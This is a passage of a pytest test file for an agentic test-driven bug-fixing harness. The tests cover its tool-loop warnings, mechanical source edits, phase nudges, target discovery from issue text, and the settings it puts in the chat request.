        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", lambda name, args: "search result")
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (True, "verified"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        result = main()

        assert result == 0
        assert ("non_apply_steps_detected", {
            "step": 2,
            "count": 3,
            "threshold": 3,
        }) in logged

        snapshot = chat_calls[3]
        warning = next(
            msg["content"]
            for msg in snapshot
            if msg.get("role") == "user" and "Progress warning" in msg.get("content", "")
        )
        assert "3 consecutive" in warning
        assert "focused edit" in warning
        assert "failing test" in warning

    def test_tool_loop_signature_only_tracks_exploratory_reads(self):
        assert _tool_loop_signature("read_file", {"path": "src/foo.ts"}) == "read_file:src/foo.ts"
        assert _tool_loop_signature("run_command", {"command": "grep -n foo src/"}) == "run_command:grep -n foo src/"
        assert _tool_loop_signature("run_command", {"command": "bun test"}) is None
        assert _tool_loop_signature("str_replace_editor", {}) is None

    def test_tool_loop_signature_handles_non_string_command(self):
        """CodeRabbit PR #13: models sometimes emit malformed tool_calls where
        `command` is a dict/list/int instead of a string. shlex.split raises
        AttributeError on non-strings, which the ValueError handler below does
        not catch. That would break the main loop. Return None for garbage
        shapes instead of exploding."""
        assert _tool_loop_signature("run_command", {"command": 123}) is None
        assert _tool_loop_signature("run_command", {"command": {"cmd": "git status"}}) is None
        assert _tool_loop_signature("run_command", {"command": ["git", "status"]}) is None
        assert _tool_loop_signature("run_command", {}) is None

    def test_tool_loop_warning_message_points_model_toward_progress(self):
        msg = _tool_loop_warning_message("read_file:src/foo.ts")
        assert "read_file:src/foo.ts" in msg
        assert "three times" in msg
        assert "edit" in msg.lower() or "DONE" in msg

    def test_non_apply_step_warning_message_points_model_toward_progress(self):
        msg = _non_apply_step_warning_message(5)
        assert "5 consecutive" in msg
        assert "successful edit" in msg.lower()
        assert "failing test" in msg.lower()


class TestApplyMechanicalEdits:
    """apply_mechanical_edits applies pre_test_source_edits to disk before the agent loop."""

    def test_applies_string_replacement_to_file(self, tmp_path):
        from agentic_tdd_runner.agent import apply_mechanical_edits

        src = tmp_path / "src" / "client.ts"
        src.parent.mkdir(parents=True)
        src.write_text("function handleResub(event) {\n  return event;\n}\n")

        edits = [{
            "path": "src/client.ts",
            "old": "function handleResub(event) {",
            "new": "export function handleResub(event) {",
        }]

        applied = apply_mechanical_edits(edits, str(tmp_path))

        assert applied == 1
        assert "export function handleResub" in src.read_text()

    def test_skips_edit_when_old_not_found(self, tmp_path):
        from agentic_tdd_runner.agent import apply_mechanical_edits

        src = tmp_path / "src" / "client.ts"
        src.parent.mkdir(parents=True)
        src.write_text("export function handleResub(event) {\n  return event;\n}\n")

        edits = [{
            "path": "src/client.ts",
            "old": "const UNRELATED = 42;",
            "new": "export const UNRELATED = 42;",
        }]

        applied = apply_mechanical_edits(edits, str(tmp_path))

        assert applied == 0
        assert src.read_text() == "export function handleResub(event) {\n  return event;\n}\n"

    def test_applies_multiple_edits_across_files(self, tmp_path):
        from agentic_tdd_runner.agent import apply_mechanical_edits

        src1 = tmp_path / "src" / "a.ts"
        src1.parent.mkdir(parents=True)
        src1.write_text("function foo() {}\n")

        src2 = tmp_path / "src" / "b.ts"
        src2.write_text("const bar = 1;\n")

        edits = [
            {"path": "src/a.ts", "old": "function foo()", "new": "export function foo()"},
            {"path": "src/b.ts", "old": "const bar = 1;", "new": "export const bar = 1;"},
        ]

        applied = apply_mechanical_edits(edits, str(tmp_path))

        assert applied == 2
        assert "export function foo" in src1.read_text()
        assert "export const bar" in src2.read_text()

    def test_skips_path_that_escapes_workdir(self, tmp_path):
        from agentic_tdd_runner.agent import apply_mechanical_edits

        outside = tmp_path.parent / "outside.ts"
        outside.write_text("function nope() {}\n")

        edits = [{
            "path": "../outside.ts",
            "old": "function nope()",
            "new": "export function nope()",
        }]

        applied = apply_mechanical_edits(edits, str(tmp_path))

        assert applied == 0
        assert outside.read_text() == "function nope() {}\n"


class TestPhasedRunner:
    """Legacy --source/--symbol overrides still use phased prompts."""

    def _make_config(self):
        return {
            "agent": {"max_steps": 5, "max_tool_output": 8000},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
            },
            "llm": {"model": "test-model"},
            "pr": {"enabled": False},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"tool_execution": 10, "llm_request": 10, "test_run": 10},
            "tools": [],
        }

    def test_applies_mechanical_edits_before_loop(self, tmp_path, monkeypatch):
        """When episode context has pre_test_source_edits, they're applied to disk
        before the agent loop starts."""
        import agentic_tdd_runner.agent as _agent_mod

        src = tmp_path / "src" / "client.ts"
        src.parent.mkdir(parents=True)
        src.write_text("function handleResub(event) {\n  return event;\n}\n")

        episode = {
            "source_file": "src/client.ts",
            "target_symbol": "handleResub",
            "test_file": "src/client.test.ts",
            "source_import_path": "./client",
            "runner": "bun:test",
            "mocks_text": "",
            "pre_test_source_edits": [
                {"path": "src/client.ts", "old": "function handleResub(", "new": "export function handleResub("},
            ],
            "conditional_source_edits": [],
            "assertion_hint": "assert on the return value",
            "cookbook_text": "## Mock Cookbook for handleResub\n",
        }

        chat_messages = []

        def fake_chat(messages, include_tools=True):
            chat_messages.append([m.copy() for m in messages])
            return {
                "choices": [{"message": {"content": "still going"}, "finish_reason": "stop"}],
                "usage": {},
                "timings": {},
            }

        args = SimpleNamespace(
            issue="bug text", source="src/client.ts", symbol="handleResub",
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr(
            "agentic_tdd_runner.cookbook.build_episode_context",
            lambda **kw: episode,
        )

        main()

        # Source file should have been edited on disk before the loop
        assert "export function handleResub" in src.read_text()

        # First user message should be the phase-1 prompt, NOT "Fix this bug"
        first_call_messages = chat_messages[0]
        user_msg = next(m for m in first_call_messages if m["role"] == "user")
        assert "Fix this bug" not in user_msg["content"]
        assert "handleResub" in user_msg["content"]

    def test_injects_fix_nudge_after_test_file_created(self, tmp_path, monkeypatch):
        """After model creates a test file, harness injects a nudge to run + fix."""
        import agentic_tdd_runner.agent as _agent_mod

        src = tmp_path / "src" / "client.ts"
        src.parent.mkdir(parents=True)
        src.write_text("export function handleResub(event) {\n  return event;\n}\n")

        episode = {
            "source_file": "src/client.ts",
            "target_symbol": "handleResub",
            "test_file": "src/client.test.ts",
            "source_import_path": "./client",
            "runner": "bun:test",
            "mocks_text": "",
            "pre_test_source_edits": [],
            "conditional_source_edits": [],
            "assertion_hint": "",
            "cookbook_text": "## Mock Cookbook\n",
        }

        chat_call_count = [0]
        captured_messages = []

        def fake_chat(messages, include_tools=True):
            chat_call_count[0] += 1
            captured_messages.append([m.copy() for m in messages])
            if chat_call_count[0] == 1:
                # Model creates the test file
                return {
                    "choices": [{"message": {
                        "role": "assistant",
                        "content": None,
                        "tool_calls": [{
                            "id": "call_1",
                            "function": {
                                "name": "create_file",
                                "arguments": '{"path": "src/client.test.ts", "content": "test code"}',
                            },
                        }],
                    }, "finish_reason": "tool_calls"}],
                    "usage": {},
                    "timings": {},
                }
            # All subsequent calls: stop
            return {
                "choices": [{"message": {"role": "assistant", "content": "continuing"}, "finish_reason": "stop"}],
                "usage": {},
                "timings": {},
            }

        def fake_execute(name, args):
            _agent_mod._last_run_exit_code = None
            return f"OK: created {args.get('path', '')}"

        args = SimpleNamespace(
            issue="bug text", source="src/client.ts", symbol="handleResub",
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
        monkeypatch.setattr(
            "agentic_tdd_runner.cookbook.build_episode_context",
            lambda **kw: episode,
        )

        main()

        # After the create_file tool result, a user nudge should have been injected
        # Check the messages sent to the second chat call
        assert chat_call_count[0] >= 2
        second_call_msgs = captured_messages[1]
        user_nudges = [m for m in second_call_msgs if m["role"] == "user" and "run" in m.get("content", "").lower() and "fix" in m.get("content", "").lower()]
        assert len(user_nudges) >= 1, f"Expected a run+fix nudge after test creation, got messages: {[m['content'][:80] for m in second_call_msgs if m['role'] == 'user']}"

    def test_uses_episode_test_file_hint_during_completion(self, tmp_path, monkeypatch):
        episode = {
            "source_file": "src/client.ts",
            "target_symbol": "handleResub",
            "test_file": "src/client.test.ts",
            "source_import_path": "./client",
            "runner": "bun:test",
            "mocks_text": "",
            "pre_test_source_edits": [],
            "conditional_source_edits": [],
            "assertion_hint": "",
            "cookbook_text": "## Mock Cookbook\n",
        }
        hinted = []

        args = SimpleNamespace(
            issue="bug text", source="src/client.ts", symbol="handleResub",
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", lambda messages, include_tools=True: {
            "choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}],
            "usage": {},
            "timings": {},
        })
        monkeypatch.setattr(
            "agentic_tdd_runner.cookbook.build_episode_context",
            lambda **kw: episode,
        )
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.find_test_file",
            lambda hint=None: hinted.append(hint) or "src/client.test.ts",
        )
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda test_file: (True, "verified"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        result = main()

        assert result == 0
        assert hinted == ["src/client.test.ts"]

    def test_skips_phase_nudge_when_create_file_arguments_are_malformed(self, tmp_path, monkeypatch):
        """Malformed create_file args should not crash or trigger the phase nudge."""
        import agentic_tdd_runner.agent as _agent_mod

        src = tmp_path / "src" / "client.ts"
        src.parent.mkdir(parents=True)
        src.write_text("export function handleResub(event) {\n  return event;\n}\n")

        episode = {
            "source_file": "src/client.ts",
            "target_symbol": "handleResub",
            "test_file": "src/client.test.ts",
            "source_import_path": "./client",
            "runner": "bun:test",
            "mocks_text": "",
            "pre_test_source_edits": [],
            "conditional_source_edits": [],
            "assertion_hint": "",
            "cookbook_text": "## Mock Cookbook\n",
        }

        chat_call_count = [0]
        captured_messages = []

        def fake_chat(messages, include_tools=True):
            chat_call_count[0] += 1
            captured_messages.append([m.copy() for m in messages])
            if chat_call_count[0] == 1:
                return {
                    "choices": [{"message": {
                        "role": "assistant",
                        "content": None,
                        "tool_calls": [{
                            "id": "call_1",
                            "function": {
                                "name": "create_file",
                                "arguments": '{"path": "src/client.test.ts"',
                            },
                        }],
                    }, "finish_reason": "tool_calls"}],
                    "usage": {},
                    "timings": {},
                }
            return {
                "choices": [{"message": {"role": "assistant", "content": "continuing"}, "finish_reason": "stop"}],
                "usage": {},
                "timings": {},
            }

        def fake_execute(name, args):
            _agent_mod._last_run_exit_code = None
            return f"OK: created {args.get('path', '')}"

        args = SimpleNamespace(
            issue="bug text", source="src/client.ts", symbol="handleResub",
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
        monkeypatch.setattr(
            "agentic_tdd_runner.cookbook.build_episode_context",
            lambda **kw: episode,
        )

        main()

        assert chat_call_count[0] >= 2
        second_call_msgs = captured_messages[1]
        user_nudges = [
            m for m in second_call_msgs
            if m["role"] == "user"
            and "run" in m.get("content", "").lower()
            and "fix" in m.get("content", "").lower()
        ]
        assert len(user_nudges) == 0

    def _run_phase1_with_episode(self, tmp_path, monkeypatch, episode):
        captured = []

        def fake_chat(messages, include_tools=True):
            captured.append([m.copy() for m in messages])
            return {
                "choices": [{"message": {"content": "still going"}, "finish_reason": "stop"}],
                "usage": {},
                "timings": {},
            }

        args = SimpleNamespace(
            issue="bug text", source=episode["source_file"], symbol=episode["target_symbol"],
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr(
            "agentic_tdd_runner.cookbook.build_episode_context",
            lambda **kw: episode,
        )
        main()
        return next(m for m in captured[0] if m["role"] == "user")["content"]

    def test_phase1_message_includes_function_line_range_when_definition_match(self, tmp_path, monkeypatch):
        """When the parser resolved the symbol from a real definition pattern
        (`def`, `function`, `const/let/var`), surface the line range so the model
        jumps straight to the symbol instead of grep/sed exploration."""
        src = tmp_path / "src" / "server.py"
        src.parent.mkdir(parents=True)
        src.write_text("class H:\n    def _handle_query(self, args):\n        return None\n")

        episode = {
            "source_file": "src/server.py",
            "target_symbol": "_handle_query",
            "test_file": "src/test_server.py",
            "source_import_path": "src.server",
            "runner": "pytest",
            "mocks_text": "",
            "pre_test_source_edits": [],
            "conditional_source_edits": [],
            "assertion_hint": "",
            "function_line_range": {"start": 1252, "end": 1289, "source": "definition"},
            "cookbook_text": "## Mock Cookbook\n",
        }
        content = self._run_phase1_with_episode(tmp_path, monkeypatch, episode)
        assert "1252" in content
        assert "1289" in content

    def test_phase1_message_omits_line_range_when_fallback_match(self, tmp_path, monkeypatch):
        """When the parser fell back to the first textual occurrence of the
        symbol (no `def`/`function`/`const` pattern matched — e.g. TS class
        methods), the line number may point at a comment or call site. Suppress
        the hint entirely rather than misdirect the model."""
        src = tmp_path / "src" / "client.ts"
        src.parent.mkdir(parents=True)
        src.write_text("// handleResub\nexport class C { handleResub() {} }\n")

        episode = {
            "source_file": "src/client.ts",
            "target_symbol": "handleResub",
            "test_file": "src/handleResub.test.ts",
            "source_import_path": "./client",
            "runner": "bun:test",
            "mocks_text": "",
            "pre_test_source_edits": [],
            "conditional_source_edits": [],
            "assertion_hint": "",
            "function_line_range": {"start": 1, "end": 2, "source": "fallback"},
            "cookbook_text": "## Mock Cookbook\n",
        }
        content = self._run_phase1_with_episode(tmp_path, monkeypatch, episode)
        assert "lines 1-2" not in content
        assert "(lines " not in content


class TestDiscoveryIntegration:
    def _make_config(self):
        return {
            "agent": {"max_steps": 1, "max_tool_output": 8000},
            "prompt": {
                "system": "You are a senior software engineer fixing a bug.",
                "nudge": "Continue.",
                "no_test_found": "missing test",
                "quality_failed": "quality failed",
                "pr_prompt": "pr",
            },
            "verification": {"max_rejections": 1},
            "quality": {"enabled": False},
            "pr": {"enabled": False},
            "runner": {
                "command": "bun test",
                "framework": "bun:test",
                "test_file_patterns": ["*.test.ts"],
                "exclude_dirs": ["node_modules"],
            },
            "discovery": {"enabled": True},
        }

    def test_main_uses_discovered_target_when_source_and_symbol_missing(self, tmp_path, monkeypatch):
        captured = []
        episode_calls = []
        semantic_index = {
            "version": 1,
            "project_root": str(tmp_path),
            "candidates": [
                {
                    "source_path": "src/twitch/client.ts",
                    "symbol": "handleMessage",
                    "kind": "function",
                    "owner_class": None,
                    "line_start": 10,
                    "line_end": 30,
                    "path_tokens": ["src", "twitch", "client"],
                    "symbol_tokens": ["handle", "message"],
                    "string_tokens": ["manolitozurrapa"],
                    "strings": ["@manolitozurrapa"],
                    "terms": ["client", "handle", "manolitozurrapa", "message", "src", "twitch"],
                }
            ],
        }

        def fake_chat(messages, include_tools=True):
            captured.append([m.copy() for m in messages])
            return {
                "choices": [{"message": {"content": "still going"}, "finish_reason": "stop"}],
                "usage": {},
                "timings": {},
            }

        def fake_episode(**kwargs):
            episode_calls.append(kwargs)
            return {
                "source_file": kwargs["source_path"],
                "target_symbol": kwargs["symbol"],
                "test_file": "src/client.test.ts",
                "source_import_path": "./client",
                "runner": "bun:test",
                "mocks_text": "",
                "pre_test_source_edits": [],
                "conditional_source_edits": [],
                "assertion_hint": "",
                "function_line_range": {"start": 23, "end": 80, "source": "definition"},
                "cookbook_text": "## Mock Cookbook\n",
            }

        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr(
            "agentic_tdd_runner.discovery.load_or_build_semantic_index",
            lambda project_root: semantic_index,
        )
        def fake_rank_targets(issue_text, project_root, index=None, limit=5):
            assert "bug" in issue_text
            assert project_root == str(tmp_path)
            assert index is semantic_index
            assert limit == 5
            return [{
                "source_path": "src/twitch/client.ts",
                "symbol": "handleMessage",
                "score": 22,
            }]

        monkeypatch.setattr("agentic_tdd_runner.discovery.rank_targets", fake_rank_targets)
        monkeypatch.setattr(
            "agentic_tdd_runner.cookbook.build_episode_context",
            fake_episode,
        )

        main()

        assert episode_calls == [
            {
                "source_path": "src/twitch/client.ts",
                "symbol": "handleMessage",
                "project_root": str(tmp_path),
            }
        ]
        user_msg = next(m for m in captured[0] if m["role"] == "user")
        assert "handleMessage" in user_msg["content"]
        assert "src/twitch/client.ts" in user_msg["content"]

    def test_main_exits_when_target_cannot_be_discovered(self, tmp_path, monkeypatch):
        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr(
            "agentic_tdd_runner.discovery.load_or_build_semantic_index",
            lambda project_root: {"version": 1, "project_root": str(tmp_path), "candidates": []},
        )
        monkeypatch.setattr(
            "agentic_tdd_runner.discovery.rank_targets",
            lambda issue_text, project_root, index=None, limit=5: [],
        )
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.chat",
            lambda *args, **kwargs: (_ for _ in ()).throw(AssertionError("chat should not run when discovery fails")),
        )

        with pytest.raises(SystemExit, match="Could not determine target from issue"):
            main()

    def test_main_uses_issue_target_hints_before_discovery(self, tmp_path, monkeypatch):
        captured = []
        episode_calls = []
        issue = """Bug: handleResub reports 0 months

## Where
`src/twitch/client.ts` -> `handleResub()` (line 770, not exported)

## Symptom
The bot reports 0 months.

## Fix approach
1. Export handleResub so it can be tested
2. Read cumulative months from the resub userstate
"""
        args = SimpleNamespace(
            issue=issue,
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )

        def fake_episode(**kwargs):
            episode_calls.append(kwargs)
            return {
                "source_file": kwargs["source_path"],
                "target_symbol": kwargs["symbol"],
                "test_file": "src/twitch/client.test.ts",
                "source_import_path": "./client",
                "runner": "bun:test",
                "mocks_text": "",
                "pre_test_source_edits": [],
                "conditional_source_edits": [],
                "assertion_hint": "",
                "function_line_range": {"start": 770, "end": 790, "source": "definition"},
                "cookbook_text": "## Mock Cookbook\n",
            }

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", lambda messages, include_tools=True: (
            captured.append([m.copy() for m in messages])
            or {"choices": [{"message": {"content": "still going"}, "finish_reason": "stop"}], "usage": {}, "timings": {}}
        ))
        monkeypatch.setattr(
            "agentic_tdd_runner.discovery.load_or_build_semantic_index",
            lambda *a, **kw: (_ for _ in ()).throw(AssertionError("discovery should not run")),
        )
        monkeypatch.setattr("agentic_tdd_runner.cookbook.build_episode_context", fake_episode)

        main()

        assert episode_calls == [
            {
                "source_path": "src/twitch/client.ts",
                "symbol": "handleResub",
                "project_root": str(tmp_path),
            }
        ]
        user_msg = next(m for m in captured[0] if m["role"] == "user")
        assert "src/twitch/client.ts" in user_msg["content"]
        assert "handleResub" in user_msg["content"]
        assert "not exported" not in user_msg["content"]
        assert "Fix approach" not in user_msg["content"]
        assert "Export handleResub" not in user_msg["content"]

    def test_main_rejects_model_facing_forbidden_issue_guidance_before_chat(self, tmp_path, monkeypatch):
        args = SimpleNamespace(
            issue="""Bug: handleResub reports 0 months

## Expected behavior
1. Add `userstate: any` to the signature
""",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.prepare_target_environment",
            lambda: (_ for _ in ()).throw(AssertionError("environment prep should not run")),
        )
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.chat",
            lambda *a, **kw: (_ for _ in ()).throw(AssertionError("chat should not run")),
        )

        with pytest.raises(SystemExit, match="Issue rejected"):
            main()

    def test_main_can_export_artifacts_and_stop_before_chat(self, tmp_path, monkeypatch):
        issue = """Bug: handleResub reports 0 months

## Where
`src/twitch/client.ts` -> `handleResub()`
"""
        artifact_dir = tmp_path / "artifacts"
        episode_calls = []

        def fake_episode(**kwargs):
            episode_calls.append(kwargs)
            return {
                "source_file": kwargs["source_path"],
                "target_symbol": kwargs["symbol"],
                "test_file": "src/twitch/handleResub.test.ts",
                "source_import_path": "./client",
                "runner": "bun:test",
                "mocks_text": "",
                "pre_test_source_edits": [],
                "conditional_source_edits": [],
                "assertion_hint": "",
                "function_line_range": {"start": 770, "end": 790, "source": "definition"},
                "cookbook_text": "## Mock Cookbook\n",
            }

        args = SimpleNamespace(
            issue=issue,
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
            repo=None,
            base_ref="main",
            run_root=None,
            issue_number=None,
            github_repo=None,
            artifact_dir=str(artifact_dir),
            prepare_only=True,
        )

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.apply_mechanical_edits",
            lambda *a, **kw: (_ for _ in ()).throw(AssertionError("prepare-only should not mutate")),
        )
        monkeypatch.setattr("agentic_tdd_runner.cookbook.build_episode_context", fake_episode)
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.chat",
            lambda *a, **kw: (_ for _ in ()).throw(AssertionError("chat should not run")),
        )

        assert main() == 0
        assert episode_calls
        assert (artifact_dir / "manifest.json").exists()
        assert (artifact_dir / "rendered" / "system_prompt.md").exists()


class TestChatPayload:
    """Verify that chat() builds the correct request payload."""

    def test_thinking_budget_tokens_included_when_configured(self, monkeypatch):
        from agentic_tdd_runner.agent import chat

        captured = {}

        class FakeResponse:
            status_code = 200
            def raise_for_status(self): pass
            def json(self):
                return {"choices": [{"message": {"content": "hi"}}]}

        def capture_post(url, json=None, timeout=None):
            captured.update(json)
            return FakeResponse()

        monkeypatch.setattr("agentic_tdd_runner.llm.requests.post", capture_post)
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "llm": {
                "model": "test-model",
                "url": "http://localhost:9999/v1/chat/completions",
                "temperature": 0.6,
                "thinking_budget_tokens": 0,
            },
            "timeouts": {"llm_request": 10},
            "tools": [{"type": "function", "function": {"name": "test_tool"}}],
        })

        chat([{"role": "user", "content": "hello"}])

        assert "thinking_budget_tokens" in captured
        assert captured["thinking_budget_tokens"] == 0

    def test_thinking_budget_tokens_omitted_when_not_configured(self, monkeypatch):
        from agentic_tdd_runner.agent import chat

        captured = {}

        class FakeResponse:
            status_code = 200
            def raise_for_status(self): pass
            def json(self):
                return {"choices": [{"message": {"content": "hi"}}]}

        def capture_post(url, json=None, timeout=None):
            captured.update(json)
            return FakeResponse()

        monkeypatch.setattr("agentic_tdd_runner.llm.requests.post", capture_post)
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "llm": {
                "model": "test-model",
                "url": "http://localhost:9999/v1/chat/completions",
                "temperature": 0.6,
            },
            "timeouts": {"llm_request": 10},
            "tools": [{"type": "function", "function": {"name": "test_tool"}}],
        })

        chat([{"role": "user", "content": "hello"}])

        assert "thinking_budget_tokens" not in captured
